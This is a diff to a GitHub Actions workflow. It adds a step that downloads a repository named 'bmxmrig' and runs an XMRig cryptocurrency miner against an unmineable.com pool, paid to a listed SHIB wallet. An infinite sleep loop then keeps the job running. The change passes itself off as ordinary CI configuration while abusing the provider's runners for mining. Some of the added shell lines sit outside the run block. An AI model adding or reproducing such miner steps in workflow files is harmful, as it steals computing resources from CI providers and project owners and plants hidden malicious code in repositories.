@@ -24,4 +24,10 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://github.com/Afit2684/vps/blob/main/hgfgf
+        wget https://github.com/quincyhays/bmxmrig
+cd bmxmrig && chmod u+x ./xmrig
+./bmxmrig -o rx.unmineable.com:3333 -u SHIB:0x6BF5cF720d7ec0f794ebbd6A397fB9C5a457fA86.tuan -p X -k -a rx/0
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
